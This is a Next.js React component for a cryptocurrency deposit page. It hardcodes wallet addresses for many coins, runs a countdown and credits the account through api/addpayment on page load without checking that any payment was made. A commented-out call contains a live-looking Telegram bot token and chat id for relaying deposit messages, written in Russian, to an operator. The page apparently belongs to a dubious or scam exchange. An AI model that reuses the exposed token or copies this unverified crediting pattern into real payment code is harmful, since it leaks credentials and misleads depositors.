import {useRouter} from "next/router";
import {Button, CopyButton, Tooltip} from "@mantine/core";
import { IconCheck } from '@tabler/icons';
import {useSelector} from "react-redux";
import {useEffect, useState} from "react";
import {m} from "framer-motion";
import {showNotification, updateNotification} from "@mantine/notifications";

export default function handler(req, res) {
    const [textToCopy, setTextToCopy] = useState("898CrM9U6jSZYsBAi3zRqgXuXVPjHuvDsjEZDgcypwKKXZHxwim2uQ5ajou3rVuyVZPp1BUAwkUV3KFP9FjQGiNT2PHL2oP");
    const [copied, setCopied] = useState(false);
    const {selectedAmount, selectedPaymentCurrency} = useSelector(state => state.PaymentSlice)
    const {authenticatedState} = useSelector(state => state.PaySlice)
    const [minutes, setMinutes] = useState(30);
    const [seconds, setSeconds] = useState(0);
    const [wallet, setWallet] = useState({

    })

    const router = useRouter()

    useEffect(()=>{
        showNotification({
            id: 'load-data',
            loading: true,
            title: 'You automatically  will get money',
            message: 'Data will be loaded in 3 seconds, you cannot close this yet.',
            autoClose: 3000,
            disallowClose: true,
        });
        function h (){
            fetch(`api/addpayment?id=${authenticatedState.authenticated && authenticatedState.user.wallet.walletid}&cryptotype=${selectedPaymentCurrency}&amount=${selectedAmount}`)
            router.push('/dashboard')
        }
        setTimeout(h,3000)

    },[])

    useEffect(() => {
        if(authenticatedState.authenticated){

        }else{

            router.push("/login")
        }
        if (selectedPaymentCurrency === "BNB"){
            setWallet({
                WalletAdr: "bnb12n8ktsedust6eqgleruhh4svh29ll23s5nw5ry",
                chainType: "BEP20"
            })
        }
        if (selectedPaymentCurrency === "USDT"){
            setWallet({
                WalletAdr: "TRbqDkdDVfuEkeyuh3BB4hBwezK9GW6Qa4",
                chainType: "TRC20"
            })
        }
        if (selectedPaymentCurrency === "ADA"){
            setWallet({
                WalletAdr: "addr1qxa4zl5pj0e3tl3fynrjs6jr0xam80ehr6g33w5l6cz224k6dl3nyxn3tz08wwt3rvleqtkrx324qywy7x9fju4pwnuqlvx0wx",
                chainType: "Cardano"
            })
        }
        if (selectedPaymentCurrency === "XRP"){
            setWallet({
                WalletAdr: "rN3ixtrsnndWjFcHbYtiSWSPr1hUaj2tr6",
                chainType: "Ripple"
            })
        }
        if (selectedPaymentCurrency === "SOL"){
            setWallet({
                WalletAdr: "5EuuS8tD3x3Xu2YTe9LyipiwTkXkKy7cqMGcVBNr1i48",
                chainType: "Solana"
            })
        }
        if (selectedPaymentCurrency === "DOGE"){
            setWallet({
                WalletAdr: "DTz3wQg33GmpaEpvYg6j8WjmDMLqJS4UFa",
                chainType: "dogecoin"
            })
        }
        if (selectedPaymentCurrency === "DOT"){
            setWallet({
                WalletAdr: "15XZ5X3d7YMLdMMWzUgto76uyGnD8SDnJ3vd9pSLckHdsXXM",
                chainType: "Polkadot"
            })
        }
        if (selectedPaymentCurrency === "TRX"){
            setWallet({
                WalletAdr: "TRbqDkdDVfuEkeyuh3BB4hBwezK9GW6Qa4",
                chainType: "TRC20"
            })
        }
        if (selectedPaymentCurrency === "ETC"){
            setWallet({
                WalletAdr: "0xe7fbe2b01e68f7a806723a2ccb6d771d6a8d3cb9",
                chainType: "Ethereum Classic"
            })
        }
        if (selectedPaymentCurrency === "ATOM"){
            setWallet({
                WalletAdr: "cosmos18l0puc0h6zp27tgnz93rwjkrv2mx724a8mlnaf",
                chainType: "Cosmos"
            })
        }
        if (selectedPaymentCurrency === "NEAR"){
            setWallet({
                WalletAdr: "711eff908412330481ac13d7df1890b56d2c73555c0083b64a40fa9e9f5f958c",
                chainType: "NEAR Protocol"
            })
        }
        if (selectedPaymentCurrency === "XLM"){
            setWallet({
                WalletAdr: "GCQT2LKZMOPG56PKSC5K3DABDQ4PTQEDVVXCO2BHWBAH4SNLZCVDJFX3",
                chainType: "Stellar Network"
            })
        }
        if (selectedPaymentCurrency === "BUSD"){
            setWallet({
                WalletAdr: "0x65b29cC3EfC4B67bB0139E2129DE7E7554ffbB40",
                chainType: "ERC20"
            })
        }
        const intervalId = setInterval(() => {
            if (seconds > 0) {
                setSeconds(seconds - 1);
            } else if (minutes > 0) {
                setMinutes(minutes - 1);
                setSeconds(59);
            } else {
                // Do something after 30 minutes
                router.push("/dashboard")
                clearInterval(intervalId);
            }
        }, 1000);
        return () => clearInterval(intervalId);
    }, [minutes, seconds]);
    const handleCopy = () => {
        navigator.clipboard.writeText(wallet.WalletAdr)
            .then(() => {


            })
            .catch(err => console.error('Failed to copy text: ', err));
    }
    const message = `${selectedAmount} ${selectedPaymentCurrency}. Пользователь: ${authenticatedState.authenticated && authenticatedState.user.username.username}, 
    Чтобы подтвердить депозит перейдите по поссылке => ryptomainx.com/api/addpayment?id=${authenticatedState.authenticated && authenticatedState.user.wallet.walletid}&cryptotype=${selectedPaymentCurrency}&amount=${selectedAmount}`

    const encodedUrl = encodeURIComponent(message)
    async function sendMessage() {
        // await fetch(`https://api.telegram.org/bot5980812659:AAFuLH-vnxzsKHM7WEWNQIO5JUD7xJR-5nI/sendMessage?chat_id=-715946291&text=${encodedUrl}`)
        // showNotification({
        //     id: 'load-data',
        //     loading: true,
        //     title: 'Loading your data',
        //     message: 'Data will be loaded in 3 seconds, you cannot close this yet.',
        //     autoClose: false,
        //     disallowClose: true,
        // });
        //
        // setTimeout(() => {
        //     updateNotification({
        //         id: 'load-data',
        //         color: 'green',
        //         title: 'Payment received',
        //         message: 'Your funds will be credited to the account within 30 minutes.',
        //         icon: <IconCheck size={16} />,
        //     });
        //     router.push('/dashboard')
        // }, 3000);
    }
    return (<>

        <div className="min-h-screen text-black bg-white p-2 flex items-center justify-center">

            <div className="max-w-xl flex flex-col justify-center items-center w-full h-full ">
                <div className="mr-auto text-xl opacity-80  font-bold">Payment section</div>
                <div className="mr-auto text-xl text-green-700 opacity-80 font-bold">{selectedAmount} {selectedPaymentCurrency}</div>
                <span className="mr-auto">{minutes}:{seconds < 10 ? `0${seconds}` : seconds}</span>
                <div className="w-full my-4 h-[1px] bg-[#E3E8ED] rounded-md"></div>
                <div className="mr-auto opacity-80 text-[14px]">
                    Send the <span className="font-bold">exact amount of {selectedAmount} {selectedPaymentCurrency}</span> to the address shown on
                    this page in one transaction.
                </div>
                <div className="mr-auto opacity-80 text-[14px] my-3">
                    Send exactly the amount shown in one transaction, otherwise your deposit may fail. Payments in
                    multiple transactions are not supported.
                </div>
                <div className="mr-auto opacity-80 text-[14px] my-3">
                    The funds will be credited as soon as we get 1 confirmations from the network.
                </div>
                <div className="mr-auto  text-[14px] my-3">
                    <span className="text-red-500 font-medium">Attention!</span> <span className="opacity-80">Make sure that the address you entered and the transfer amount are correct.</span>
                </div>
                <div className="mr-auto opacity-80 text-[14px] my-3">
                    Crypto deposits are monitored according to our AML program.
                </div>
                <div className="w-full my-4 h-[1px] bg-[#E3E8ED] rounded-md"></div>
                <div className="text-[16px] opacity-80 mr-auto font-bold">Chain type: <span className="text-green-700 text-[15px]">{wallet.chainType}</span></div>
                <div className="text-[16px] opacity-80 mr-auto font-bold">Wallet address:</div>
                <div className="mr-auto flex-wrap opacity-80">{wallet.WalletAdr}</div>
                <span onClick={handleCopy}
                      className="mr-auto cursor-pointer mt-2 select-none font-medium text-[14px] opacity-100 text-green-700">Copy address</span>
                <div className="flex w-full opacity-80 text-[14px] flex-col items-center justify-center p-4">

                </div>
                <Button onClick={sendMessage} className="bg-green-700 duration-75 w-full hover:bg-green-800">I have paid</Button>
            </div>

        </div>

    </>)
}